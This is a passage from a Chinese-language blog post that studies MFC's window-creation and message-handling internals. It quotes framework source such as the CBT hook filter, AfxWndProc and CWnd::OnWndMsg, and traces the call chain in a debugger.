punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>oldWndProc <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>oldWndProc <span class=\"token operator\">!=</span> afxWndProc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t\t\t\t<span class=\"token operator\">*</span>pOldWndProc <span class=\"token operator\">=</span> oldWndProc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t\t\tpThreadState<span class=\"token operator\">-></span>m_pWndInit <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>bContextIsDLL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// should never get here</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t<span class=\"token keyword\">static</span> ATOM s_atomMenu <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t\t\t<span class=\"token keyword\">bool</span> bSubclass <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s_atomMenu <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t\t\tWNDCLASSEX wc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t\t<span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>wc<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>WNDCLASSEX<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t\t\t\twc<span class=\"token punctuation\">.</span>cbSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>WNDCLASSEX<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t\ts_atomMenu <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ATOM<span class=\"token punctuation\">)</span><span class=\"token function\">GetClassInfoEx</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#32768\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>wc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t<span class=\"token comment\">// Do not subclass menus.</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s_atomMenu <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t\t\tATOM atomWnd <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ATOM<span class=\"token punctuation\">)</span><span class=\"token operator\">::</span><span class=\"token function\">GetClassLongPtr</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> GCW_ATOM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>atomWnd <span class=\"token operator\">==</span> s_atomMenu<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\t\t\t\tbSubclass <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\t\tTCHAR szClassName<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">::</span><span class=\"token function\">GetClassName</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> szClassName<span class=\"token punctuation\">,</span> <span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t\t\t\tszClassName<span class=\"token punctuation\">[</span><span class=\"token number\">255</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">_tcscmp</span><span class=\"token punctuation\">(</span>szClassName<span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#32768\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\t\t\t\tbSubclass <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bSubclass<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// subclass the window with the proc which does gray backgrounds</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\t\toldWndProc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>WNDPROC<span class=\"token punctuation\">)</span><span class=\"token function\">GetWindowLongPtr</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> GWLP_WNDPROC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>oldWndProc <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">GetProp</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> _afxOldWndProc<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\t\t\t<span class=\"token function\">SetProp</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> _afxOldWndProc<span class=\"token punctuation\">,</span> oldWndProc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>WNDPROC<span class=\"token punctuation\">)</span><span class=\"token function\">GetProp</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> _afxOldWndProc<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> oldWndProc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\t\t\t\t<span class=\"token function\">GlobalAddAtom</span><span class=\"token punctuation\">(</span>_afxOldWndProc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t\t\t\t\t<span class=\"token function\">SetWindowLongPtr</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> GWLP_WNDPROC<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>_AfxActivationWndProc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\t\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>oldWndProc <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>lCallNextHook<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\tLRESULT lResult <span class=\"token operator\">=</span> <span class=\"token function\">CallNextHookEx</span><span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\twParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">_AFXDLL</span></span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bContextIsDLL<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t<span class=\"token operator\">::</span><span class=\"token function\">UnhookWindowsHookEx</span><span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\tpThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t<span class=\"token keyword\">return</span> lResult<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>函数中的关键点就是：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// subclass the window with standard AfxWndProc</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t\t\tWNDPROC afxWndProc <span class=\"token operator\">=</span> <span class=\"token function\">AfxGetAfxWndProc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t\toldWndProc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>WNDPROC<span class=\"token punctuation\">)</span><span class=\"token function\">SetWindowLongPtr</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> GWLP_WNDPROC<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>afxWndProc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>把老的消息处理函数替换成了  <code>AfxGetAfxWndProc</code>  函数的返回值。</p>\n<h2 id=\"afxgetafxwndproc-函数\"><a class=\"anchor\" href=\"#afxgetafxwndproc-函数\">#</a> AfxGetAfxWndProc 函数</h2>\n<p>继续跟进  <code>AfxGetAfxWndProc</code>  函数:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// always indirectly accessed via AfxGetAfxWndProc</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>WNDPROC AFXAPI <span class=\"token function\">AfxGetAfxWndProc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_AFXDLL    </span><span class=\"token comment\">// 如果是动态库的话调用这个</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">AfxGetModuleState</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>m_pfnAfxWndProc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">else</span>            <span class=\"token comment\">// 静态库调用这个</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>AfxWndProc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现其会判断是否定义了_AFXDLL 宏，经查阅发现这是判断是否使用了动态链接库，而我们现在使用的是静态链接库，所以返回的就是   <code>AfxWndProc</code>  这个函数的地址。</p>\n<h2 id=\"afxwndproc-函数\"><a class=\"anchor\" href=\"#afxwndproc-函数\">#</a> AfxWndProc 函数</h2>\n<p>查看  <code>AfxWndProc</code>  函数:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LRESULT CALLBACK</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">AfxWndProc</span><span class=\"token punctuation\">(</span>HWND hWnd<span class=\"token punctuation\">,</span> UINT nMsg<span class=\"token punctuation\">,</span> WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// special message which identifies the window as using AfxWndProc</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nMsg <span class=\"token operator\">==</span> WM_QUERYAFXWNDPROC<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// all other messages route through message map</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tCWnd<span class=\"token operator\">*</span> pWnd <span class=\"token operator\">=</span> <span class=\"token class-name\">CWnd</span><span class=\"token operator\">::</span><span class=\"token function\">FromHandlePermanent</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pWnd <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pWnd<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span> <span class=\"token operator\">||</span> pWnd<span class=\"token operator\">-></span>m_hWnd <span class=\"token operator\">==</span> hWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pWnd <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">||</span> pWnd<span class=\"token operator\">-></span>m_hWnd <span class=\"token operator\">!=</span> hWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token operator\">::</span><span class=\"token function\">DefWindowProc</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> nMsg<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">AfxCallWndProc</span><span class=\"token punctuation\">(</span>pWnd<span class=\"token punctuation\">,</span> hWnd<span class=\"token punctuation\">,</span> nMsg<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>这样就是 Crate 的完整创建流程，首先它为我们创建了一个窗口类，填充了默认的窗口处理函数、风格、背景等等，然后通过一个  <code>SetWindowsHookEx</code> ，把我们默认的消息处理函数，替换为了  <code>AfxWndProc</code>  函数</p>\n<h1 id=\"标准消息的处理流程\"><a class=\"anchor\" href=\"#标准消息的处理流程\">#</a> 标准消息的处理流程</h1>\n<p>这里以 MFC 的三大类消息中的标准消息为主，去探寻 MFC 的消息处理流程了。</p>\n<h2 id=\"验证消息处理函数\"><a class=\"anchor\" href=\"#验证消息处理函数\">#</a> 验证消息处理函数</h2>\n<p>在消息处理函数  <code>OnLButtonDown</code>  中下断点：</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>进入上层调用函数  <code>OnWndMsg</code>  中：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>继续执行，直到进入函数  <code>OnWndMsg</code>  的上层调用函数  <code>WindowProc</code>  中：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>继续执行，直到进入函数  <code>WindowProc</code>  的上层调用函数  <code>AfxCallWndProc</code>  中：</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>继续执行，直到进入函数  <code>AfxCallWndProc</code>  的上层调用函数  <code>AfxWndProc</code>  中：</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<p>由此可知我们找的消息处理函数是正确的。</p>\n<h2 id=\"分析处理流程\"><a class=\"anchor\" href=\"#分析处理流程\">#</a> 分析处理流程</h2>\n<p>在  <code>AfxCallWndProc</code>  中下条件断点：</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>我们可以看见消息是通过  <code>WindowProc</code>  函数的，这个函数是一个虚函数，也就表示我们可以在类中改写这个函数，但是这里我们没有改写其调用的就是  <code>CWnd::WindowProc</code>  。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">virtual</span> LRESULT <span class=\"token function\">WindowProc</span><span class=\"token punctuation\">(</span>UINT message<span class=\"token punctuation\">,</span> WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">virtual</span> BOOL <span class=\"token function\">OnWndMsg</span><span class=\"token punctuation\">(</span>UINT message<span class=\"token punctuation\">,</span> WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span> pResult<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在  <code>WindowProc</code>  中调用了  <code>OnWndMsg</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LRESULT <span class=\"token class-name\">CWnd</span><span class=\"token operator\">::</span><span class=\"token function\">WindowProc</span><span class=\"token punctuation\">(</span>UINT message<span class=\"token punctuation\">,</span> WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// OnWndMsg does most of the work, except for DefWindowProc call</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tLRESULT lResult <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">OnWndMsg</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>lResult<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tlResult <span class=\"token operator\">=</span> <span class=\"token function\">DefWindowProc</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">return</span> lResult<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"onwndmsg-分析\"><a class=\"anchor\" href=\"#onwndmsg-分析\">#</a> OnWndMsg 分析</h3>\n<h4 id=\"判断消息类型\"><a class=\"anchor\" href=\"#判断消息类型\">#</a> 判断消息类型</h4>\n<p>接下来进入  <code>OnWndMsg</code>  查看，发现这个函数超级长，这里先放一小段：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token class-name\">CWnd</span><span class=\"token operator\">::</span><span class=\"token function\">OnWndMsg</span><span class=\"token punctuation\">(</span>UINT message<span class=\"token punctuation\">,</span> WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">,</span> LRESULT<span class=\"token operator\">*</span> pResult<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tLRESULT lResult <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">union</span> MessageMapFunctions mmf<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tmmf<span class=\"token punctuation\">.</span>pfn <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tCInternalGlobalLock winMsgLock<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// special case for commands</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> WM_COMMAND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">OnCommand</span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\tlResult <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token keyword\">goto</span> LReturnTrue<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>message <span class=\"token operator\">==</span> WM_CREATE <span class=\"token operator\">&amp;&amp;</span> m_pDynamicLayout <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token function\">ASSERT_VALID</span><span class=\"token punctuation\">(</span>m_pDynamicLayout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>m_pDynamicLayout<span class=\"token operator\">-></span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token 